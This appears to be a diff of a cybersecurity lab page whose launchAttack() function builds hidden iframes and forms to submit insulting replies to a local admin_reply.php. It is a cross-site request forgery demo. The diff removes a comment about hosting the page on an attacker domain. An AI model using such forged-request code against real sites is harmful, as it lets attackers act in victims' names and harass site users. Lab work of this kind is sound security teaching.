@@ -89,9 +89,6 @@
 
     <script>
         function launchAttack() {
-            // Default to localhost so the lab runs on a single XAMPP machine;
-            // for a multi-machine demo, host this file on attacker.example.com
-            // and keep targetUrl pointed at the victim's admin_reply.php.
             const targetUrl = "http://localhost/CyberProject/admin_reply.php";
             const insults = [
                 "Stop complaining! You are just a boring person.",
@@ -106,7 +103,7 @@
                 const iframe = document.createElement("iframe");
                 iframe.name = "hidden_frame_" + i;
                 iframe.style.display = "none";
-                // Now appending to the invisible container
+                // Now appending to the invisible container so we can get response back
                 container.appendChild(iframe);
 
                 const form = document.createElement("form");
